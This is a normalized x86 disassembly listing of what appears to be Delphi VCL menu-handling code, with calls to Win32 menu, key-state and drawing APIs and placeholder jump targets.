mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45adb4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45adc4
call sub_45c170
pop ecx
test al al
je r-xdata
sub_45c208
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_45c170
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_458874
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45c238
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_45c208
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_45d55c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_45c2a8
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_45c208
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_45c2c4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_45c208
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45b974
mov ebx eax
xor edx edx
mov eax edi
call sub_45be70
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45b2dc
mov eax [ esi + 0x34 ]
call sub_45b2dc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_459218
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_44f7b4
push eax
call DrawMenuBar
sub_45c3b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_45c3b0
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_45c4d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_45c208
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45b2dc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45c3a0
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_45c504
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_429d90
xor eax eax
push ebp
push sub_45c602
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_429d90
xor eax eax
push ebp
push sub_45c5d7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_45c3b0
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_429d88
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c609
mov eax [ rw-data ]
call sub_429d88
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_45c208
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_45c628
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45c9ac
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45c9ac
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_45c6e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_45cc80
mov eax ebx
call sub_4089e8
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45c784
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_45c6e4
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4043d4
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404624
lea edx [ ebp - 0x200 ]
call sub_408aac
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45c818
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_45c888
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45cd28
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45cd28
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_45cd28
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45c894
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45c784
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_45c818
mov eax ebx
call sub_45cd4c
jmp r-xdata
sub_45c8fc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45c944
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_456b74
mov eax ebx
call sub_45c158
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_456bb8
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_421254
sub_45c980
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4214a0
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45c944
sub_45c9c4
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45c208
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_45c208
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_45fcd0
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_45ca20
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_45caf5
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45c208
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45c208
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45adb4
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45adc4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_40434c
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_40434c
mov eax [ ebp - 0xc ]
pop edx
call sub_4081e0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_45d86c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cafc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404188
retn
sub_45cb08
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45c9c4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45ca20
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_45cc80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_45c38c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_45c208
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_45c208
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408a8c
mov eax [ ebp + 0x10 ]
call sub_4089d0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45cd4c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_445e6c
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45cd28
mov [ ebx + 0x41 ] 0x1
sub_45cd74
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403518
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45cd28
mov [ ebx + 0x41 ] 0x1
sub_45ce00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45c8fc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45c784
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_45ce90
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45cecc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45cef6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45cf18
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d44b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d452
lea eax [ ebp - 0x30 ]
call sub_404164
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov edx [ esi + 0x4 ]
call sub_45c2c4
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_469358
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov dx [ esi + 0x4 ]
call sub_45c2a8
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45d27e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45d261
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_4251ec
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42508c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45d6f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d268
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4251ec
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_45cb08
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_45c208
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45c208
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45d3c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45d39c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45d37f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_4251ec
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42508c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d386
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4251ec
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_4460f0
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_469358
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45c208
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_45c208
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
